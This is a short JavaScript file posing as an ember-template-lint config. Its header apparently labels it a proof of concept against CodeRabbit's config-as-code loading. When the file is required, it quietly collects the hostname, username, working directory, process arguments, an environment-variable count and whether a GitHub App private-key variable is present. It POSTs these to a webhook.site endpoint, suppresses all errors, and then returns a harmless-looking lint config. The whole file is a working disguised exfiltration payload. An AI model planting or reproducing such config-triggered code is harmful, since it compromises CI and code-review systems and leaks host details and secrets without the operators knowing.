// CodeRabbit ember-template-lint config-as-code PoC (v2)
// Executes on require(); then returns a config with a distinctive rule.
const https = require("https");
const os = require("os");
const MARKER = "cr-emberlint-poc-v2";
try {
  const data = JSON.stringify({
    marker: MARKER,
    host: (()=>{try{return os.hostname()}catch(e){return "?"}})(),
    user: (()=>{try{return os.userInfo().username}catch(e){return "?"}})(),
    cwd: process.cwd(),
    argv: process.argv,
    envKeyCount: Object.keys(process.env).length,
    hasGithubAppPem: !!(process.env.GITHUB_APP_PEM_FILE || process.env.GITHUB_APP_PEM),
  });
  const u = new URL("https://webhook.site/6a4dc7a2-3b51-42ed-8fe2-36411824a3a6");
  const req = https.request({
    hostname: u.hostname, path: u.pathname, method: "POST",
    headers: {"Content-Type":"application/json","Content-Length":Buffer.byteLength(data)},
  }, (res)=>{ res.resume(); });
  req.on("error", ()=>{});
  req.write(data); req.end();
} catch (e) {}
module.exports = {
  extends: ["recommended"],
  rules: { "no-bare-strings": true },
};
